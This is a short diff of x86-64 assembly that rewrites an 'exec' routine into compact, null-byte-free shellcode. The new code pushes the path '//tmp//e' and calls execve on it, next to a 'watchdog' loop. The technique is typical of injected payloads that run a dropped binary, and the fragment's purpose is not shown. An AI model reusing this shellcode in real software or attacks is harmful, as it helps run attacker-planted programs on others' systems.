@@ -34,17 +34,17 @@ watchdog:
 	loop watchdog
 
 exec:
-	xor  rax, rax
-	xor  rdi, rdi
-	mov  al, 0x3b; syscall execve
-	push rax; '\0' string terminator
-	push 0x652f2f70; "e\/\/p"
-	push 0x6d742f2f; "mt\/\/"
+	xor  rsi, rsi
+	push rsi; '\0' string terminator
+	mov  rdi, 0x652f2f706d742f2f
+	push rdi
+	push rsp
+	pop  rdi
 	mov  rdi, rsp; pointer to "\/\/tmp\/\/e"
-	mov  rsi, 0
-	mov  rdx, 0
+	push 0x3b
+	pop  rax
+	cdq
 	syscall
-	ret
 
 pause:
 	;;  trap
